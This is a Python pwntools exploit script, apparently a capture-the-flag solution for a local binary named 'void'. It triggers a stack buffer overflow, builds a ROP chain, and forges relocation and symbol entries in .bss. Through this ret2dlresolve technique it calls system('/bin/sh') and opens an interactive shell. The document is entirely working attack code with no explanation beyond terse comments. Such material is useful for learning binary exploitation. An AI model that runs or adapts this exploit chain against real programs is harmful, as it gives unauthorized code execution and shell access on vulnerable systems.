from pwn import *

context.arch = "amd64"

bin = ELF('./void')
p = process('./void')

PLT = 0x401020 # .plt section
JMPREL = 0x400430 # .rela.plt section
SYMTAB = 0x400330 # .symtab section
STRTAB = 0x400390 # .strtab section

# poprdi = 0x4011ab # pop rdi; ret;
# poprsir15 = 0x4011a9 # pop rsi; pop r15; ret;
leave = 0x401141 # leave; ret;

offset = 72
read = bin.plt['read']
main = bin.symbols['vuln']
bss = 0x404000

def wait():
    p.recvrepeat(0.1)

poprdi = ROP(bin).find_gadget(['pop rdi'])[0]
poprsir15 = 0x4011b9

rbp = bss + 0xe00
#need to do math to align reloc_offset and offset to symtab aligns to 0x18
resolvedata = rbp + 0x20

reloc_offset = (resolvedata - JMPREL) // 0x18
print(reloc_offset)
evilsym = resolvedata + 0x10 #to help fake symtab index align

#32 bit alignment was 0x10 for dl resolve stuff, 64 bit is 0x18 for align, make sure it is all aligned
evil = flat( #faking a ELF64_REL
    resolvedata, #r_offset
    0x7 | ((evilsym + 0x18 - SYMTAB) // 0x18) << 32, #r_info
    0, 0, 0, #alignment here
    evilsym + 0x40 - STRTAB, 0, 0, 0, 0,
    'system\x00\x00',
    '/bin/sh\x00'
    )

#gonna need rbp to be above the bare minimum because stack does operations there, trigger a read here
payload = b'A' * offset + p64(poprdi) + p64(0) + p64(poprsir15) + p64(resolvedata) + p64(0) +p64(read) + p64(main) 
p.sendline(payload)
wait()
p.sendline(evil)
ropnop = 0x000000000040109f
payload = b'A' * offset + p64(poprdi) +  p64(rbp + 0x78) + p64(PLT) + p64(reloc_offset)
wait()
p.sendline(payload)
p.interactive()